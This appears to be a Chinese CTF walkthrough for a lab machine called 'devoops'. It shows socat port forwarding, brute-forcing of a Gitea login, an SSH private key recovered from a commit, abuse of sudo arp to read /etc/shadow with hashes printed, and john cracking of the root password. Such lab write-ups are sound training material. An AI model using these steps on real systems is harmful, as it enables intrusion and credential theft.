靶机的 `Gitea `服务是有 `Web` 的，使用靶机内预留了` socat`端口转发工具,将` 127.0.0.1:3002` 转发到外网地址即可访问

```shell
kali└─# tldr socat
   sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80
#socat TCP-LISTEN:3020,fork TCP4:127.0.0.1:3002&
netstat -anlptu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2720/node
tcp        0      0 0.0.0.0:3020            0.0.0.0:*               LISTEN      2760/socat
tcp        0      0 192.168.31.25:3000      192.168.31.191:4655     ESTABLISHED 2720/node
tcp        0      0 192.168.31.25:45235     192.168.31.126:1234     ESTABLISHED 2758/sh
tcp6       0      0 ::1:3001                :::*                    LISTEN      2726/node
tcp6       0      0 ::1:49578               ::1:3001                ESTABLISHED 2720/node
tcp6       0      0 ::1:3001                ::1:49578               ESTABLISHED 2726/node
```

访问` Web `之后，自然是爆破用户名和密码,用户名就是靶机内唯一的正常用户` hana`

![image-20250530202840863](https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png)

```shell
出题者在制作靶机的时候，`Gitea` 先是监听在0.0.0.0，没有经过`socat`
`hydra`爆破速度非常快，即使是`rockyou`也能在 ~30 秒内找到密码
但是经过`socat`之后爆破效率变得很低
```

最后爆破得到密码 `saki`
进入 `Gitea` 后，查看唯一的仓库的 `commit `记录`代码`-`提交`- `del: oops!`

![image-20250530202951278](https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png)

同样可以获得 `SSH`私钥

### 获得`hana`权限

之前查看监听的端口时，发现 `SSH` 也监听在` 127.0.0.1`

```shell
#netstat -anlptu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
tcp        0     54 192.168.31.25:40561     192.168.31.126:1234     ESTABLISHED 2731/sh
tcp        0      0 192.168.31.25:3000      192.168.31.126:56472    ESTABLISHED 2659/node
tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
tcp6       0      0 ::1:3001                ::1:35602               ESTABLISHED 2664/node
tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node
```

#####  `socat `端口转发

使用本机 `socat `转发端口，将只能本机访问的`127.0.0.1:22`转发到外部网络`0.0.0.0:2222`

```shell
#which socat
/usr/bin/socat
kali└─# tldr socat
   sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80
#socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22&
#将本地端口 2222 的入站 TCP 流量转发到本机（127.0.0.1）的 22 端口
#netstat -anlptu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      2749/socat
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.31.25:40561     192.168.31.126:1234     ESTABLISHED 2731/sh
tcp        0      0 192.168.31.25:3000      192.168.31.126:56472    ESTABLISHED 2659/node
tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
tcp6       0      0 ::1:3001                ::1:35602               ESTABLISHED 2664/node
tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node
```

转出` SSH `端口后，就可以用获得的` SSH `私钥登陆了

```shell
└─# echo '------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----'>id
└─# chmod 600 id
└─# ssh hana@$IP -p 2222 -i id
#登录失败，私钥每行多了个`-`
└─# cat id | sed 's/^.//g'>id2

└─# cat id2
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
└─# chmod 600 id2
└─# ssh hana@$IP -p 2222 -i id2
devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)

```

##### 拿到`user.txt`

```shell
devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
devoops:~$ cd
devoops:~$ ls
user.flag
devoops:~$ cat user.flag

```



### 获得root

`sudo`发现 hana 用户能够以 `root `身份运行 `/sbin/arp`

```shell
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for hana:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

[[查阅](https://gtfobins.github.io/)](https://gtfobins.github.io/)` GTFObins`，发现 `arp` 可以用于任意文件读取

```shell
devoops:~$ sudo arp -v -f "/root/root.flag"
arp: cannot open etherfile /root/root.flag !
```

发现没有` root.txt `和` root.flag`
尝试读取` /etc/shadow`

```shell
devoops:~$ sudo arp -v -f "/etc/shadow"
>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
.....
runner:$6$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::
arp: format error on line 20 of etherfile /etc/shadow !
>> hana:$6$snNJGjzsPo.be3r1$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::

devoops:~$
```

发现了` root` 用户的 `shadow`

```shell
root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
```

使用 `john`爆破`hash`

```shell
└─# echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::'>shad.txt

┌──(root㉿LAPTOP-FAMILY)-[/tmp]
└─# john shad.txt --wordlist=/usr/share/wordlists/rockyou.txt
#rockyou.txt太久了换个作者喜欢的字典就很快
└─# john shad.txt --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
eris             (root)
1g 0:00:00:02 DONE (2025-05-30 00:41) 0.4032g/s 44593p/s 44593c/s 44593C/s likewise..28102005
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

找到 `root` 密码为` eris`

##### 拿到`root.txt`

```shell
devoops:~$ su -
Password:#eris
devoops:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
devoops:~#
devoops:~# cd
devoops:~# ls
N073.7X7              R007.7x7oOoOoOoOoOoO
devoops:~# cat R007.7x7oOoOoOoOoOoO

```